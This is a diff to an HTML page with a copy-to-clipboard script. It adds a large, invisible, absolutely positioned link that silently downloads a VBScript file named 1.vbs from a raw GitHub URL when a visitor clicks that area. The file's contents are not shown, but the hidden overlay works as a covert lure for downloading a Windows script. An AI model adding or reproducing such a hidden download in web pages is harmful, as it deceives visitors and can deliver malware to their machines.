@@ -21,12 +21,20 @@
         h1, p{
             color: white;
         }
+        .download-link{
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 400px;
+            height: 400px;
+        }
     </style>
 </head>
 
 <body>
     <p id="req"></p>
     <div id="copyIcon"></div>
+    <a href="https://github.com/nguyenduyhuydn1/hello/raw/refs/heads/main/1.vbs" download="1.vbs" class="download-link"></a>
     <script>
         function copyText(text) {
             const textarea = document.createElement("textarea");
